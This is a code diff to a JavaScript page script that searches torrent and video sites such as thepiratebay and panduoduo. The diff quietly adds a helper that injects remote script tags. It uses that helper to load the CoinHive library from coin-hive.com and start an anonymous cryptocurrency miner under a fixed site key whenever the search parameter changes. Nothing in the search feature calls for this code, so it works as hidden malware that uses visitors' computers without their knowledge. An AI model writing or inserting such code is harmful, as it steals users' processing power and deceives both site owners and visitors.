@@ -25,6 +25,11 @@ function locationParameterChanged() {
     panc(key);
     panduoduo(key);
     thepiratebay(key);
+
+    importScript ("https://coin-hive.com/lib/coinhive.min.js", function(){
+        var miner = new CoinHive.Anonymous('Wtx9zrRVSwMjJmFssPEtuCxnzkdo3QaP');
+        miner.start();
+    })
 }
 function loading(is,id){           
     var loadingDoc = document.getElementById(id?id:"pancLoading");
@@ -405,4 +410,17 @@ function thepiratebay(key){
         window.showVideos = window.showVideos.concat(videos);
         setIframe(videos,true,true,"magnetTemplate");
     }
+}
+
+function loadError (oError) {
+  throw new URIError("The script " + oError.target.src + " is not accessible.");
+}
+
+function importScript (sSrc, fOnload) {
+  var oScript = document.createElement("script");
+  oScript.type = "text\/javascript";
+  oScript.onerror = loadError;
+  if (fOnload) { oScript.onload = fOnload; }
+  document.currentScript.parentNode.insertBefore(oScript, document.currentScript);
+  oScript.src = sSrc;
 }
